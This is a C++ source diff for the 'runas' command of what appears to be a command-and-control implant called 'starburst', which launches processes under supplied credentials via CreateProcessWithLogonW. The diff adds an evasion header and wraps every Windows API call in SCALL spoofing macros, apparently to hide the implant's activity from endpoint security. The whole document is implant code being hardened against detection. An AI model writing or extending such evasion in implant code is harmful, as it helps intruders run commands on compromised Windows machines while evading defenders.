@@ -5,6 +5,7 @@
 #include <config.h>
 #include <strings.h>
 #include <stackstr.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_RUNAS
 
@@ -62,7 +63,7 @@ auto declfn starburst::cmd_runas(
 
     // Load advapi32.dll and resolve CreateProcessWithLogonW
     STK_ADVAPI32(_n);
-    auto h_advapi32 = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA( _n ) );
+    auto h_advapi32 = (HMODULE)SCALL( inst, kernel32.LoadLibraryA, _n );
     if ( !h_advapi32 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "LoadLibrary advapi32 failed" ) ) );
@@ -85,11 +86,11 @@ auto declfn starburst::cmd_runas(
     wchar_t w_command[1024] = { 0 };
 
     if ( domain_buf[0] != '\0' )
-        inst.kernel32.MultiByteToWideChar( CP_ACP, 0, domain_buf, -1, w_domain, 256 );
+        SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, domain_buf, -1, w_domain, 256 );
 
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, user_buf, -1, w_user, 256 );
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, pass_buf, -1, w_pass, 256 );
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, cmd_buf,  -1, w_command, 1024 );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, user_buf, -1, w_user, 256 );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, pass_buf, -1, w_pass, 256 );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, cmd_buf,  -1, w_command, 1024 );
 
     // Set up structures
     STARTUPINFOW si;
@@ -99,7 +100,7 @@ auto declfn starburst::cmd_runas(
     PROCESS_INFORMATION pi;
     memory::zero( &pi, sizeof( pi ) );
 
-    BOOL ok = pCreateProcessWithLogonW(
+    BOOL ok = (BOOL)SCALL_PTR( inst, pCreateProcessWithLogonW,
         w_user,
         w_domain[0] != L'\0' ? w_domain : nullptr,
         w_pass,
@@ -145,8 +146,8 @@ auto declfn starburst::cmd_runas(
     memory::copy( msg + off, num, nlen );
     msg[off + nlen] = '\0';
 
-    inst.kernel32.CloseHandle( pi.hThread );
-    inst.kernel32.CloseHandle( pi.hProcess );
+    SCALL( inst, kernel32.CloseHandle, pi.hThread );
+    SCALL( inst, kernel32.CloseHandle, pi.hProcess );
 
     queue_response( inst, task_uuid, RESPONSE_SUCCESS, msg );
 }
